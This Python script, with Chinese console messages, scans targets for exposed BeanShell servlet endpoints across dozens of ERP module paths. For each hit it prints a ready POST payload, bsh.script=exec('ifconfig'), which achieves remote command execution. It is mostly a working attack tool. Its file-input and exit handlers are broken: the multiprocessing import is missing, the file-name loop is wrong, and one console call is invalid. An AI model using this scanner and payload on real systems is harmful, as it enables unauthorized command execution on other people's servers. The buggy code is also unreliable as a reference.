import requests
import re
import sys
from urllib.parse import quote
import argparse
from rich.console import Console

console = Console()
payloaddata=["/service/~aim/bsh.servlet.BshServlet","/service/~alm/bsh.servlet.BshServlet","/service/~ampub/bsh.servlet.BshServlet","/service/~arap/bsh.servlet.BshServlet","/service/~aum/bsh.servlet.BshServlet","/service/~cc/bsh.servlet.BshServlet","/service/~cdm/bsh.servlet.BshServlet","/service/~cmp/bsh.servlet.BshServlet","/service/~ct/bsh.servlet.BshServlet","/service/~dm/bsh.servlet.BshServlet","/service/~erm/bsh.servlet.BshServlet","/service/~fa/bsh.servlet.BshServlet","/service/~fac/bsh.servlet.BshServlet","/service/~fbm/bsh.servlet.BshServlet","/service/~ff/bsh.servlet.BshServlet","/service/~fip/bsh.servlet.BshServlet","/service/~fipub/bsh.servlet.BshServlet","/service/~fp/bsh.servlet.BshServlet","/service/~fts/bsh.servlet.BshServlet","/service/~fvm/bsh.servlet.BshServlet","/service/~gl/bsh.servlet.BshServlet","/service/~hrhi/bsh.servlet.BshServlet","/service/~hrjf/bsh.servlet.BshServlet","/service/~hrpd/bsh.servlet.BshServlet","/service/~hrpub/bsh.servlet.BshServlet","/service/~hrtrn/bsh.servlet.BshServlet","/service/~hrwa/bsh.servlet.BshServlet","/service/~ia/bsh.servlet.BshServlet","/service/~ic/bsh.servlet.BshServlet","/service/~iufo/bsh.servlet.BshServlet","/service/~modules/bsh.servlet.BshServlet","/service/~mpp/bsh.servlet.BshServlet","/service/~obm/bsh.servlet.BshServlet","/service/~pu/bsh.servlet.BshServlet","/service/~qc/bsh.servlet.BshServlet","/service/~sc/bsh.servlet.BshServlet","/service/~scmpub/bsh.servlet.BshServlet","/service/~so/bsh.servlet.BshServlet","/service/~so2/bsh.servlet.BshServlet","/service/~so3/bsh.servlet.BshServlet","/service/~so4/bsh.servlet.BshServlet","/service/~so5/bsh.servlet.BshServlet","/service/~so6/bsh.servlet.BshServlet","/service/~tam/bsh.servlet.BshServlet","/service/~tbb/bsh.servlet.BshServlet","/service/~to/bsh.servlet.BshServlet","/service/~uap/bsh.servlet.BshServlet","/service/~uapbd/bsh.servlet.BshServlet","/service/~uapde/bsh.servlet.BshServlet","/service/~uapeai/bsh.servlet.BshServlet","/service/~uapother/bsh.servlet.BshServlet","/service/~uapqe/bsh.servlet.BshServlet","/service/~uapweb/bsh.servlet.BshServlet","/service/~uapws/bsh.servlet.BshServlet","/service/~vrm/bsh.servlet.BshServlet","/service/~yer/bsh.servlet.BshServlet"]
def main(target_url):
    console.print('[*]正在检测漏洞是否存在BeanShell命令执行漏洞',style='bold blue')
    #url = target_url + '/servlet/~ic/bsh.servlet.BshServlet'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        #for payload in open('bsh_shell.txt', 'r'):
        for payload in payloaddata:
            url = target_url + payload
            response = requests.get(url=url, headers=headers, timeout=5)
            if response.status_code == 200 and 'BeanShell' in response.text:
                console.print('[SUCCESS]BeanShell页面存在, 可能存在漏洞: {}'.format(url),style='bold green')
                console.print('[SUCCESS]改漏洞使用方式POST请求：bsh.script=ex\u0065c("ifconfig");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\n',style='bold green')
                return url
        else:
            console.print('[WARNING]BeanShell页面漏洞不存在\n', style='bold yellow')
    except:
        console.print('[WARNING] 无法该目标无法建立连接\n', style='bold yellow')

if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url')
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')
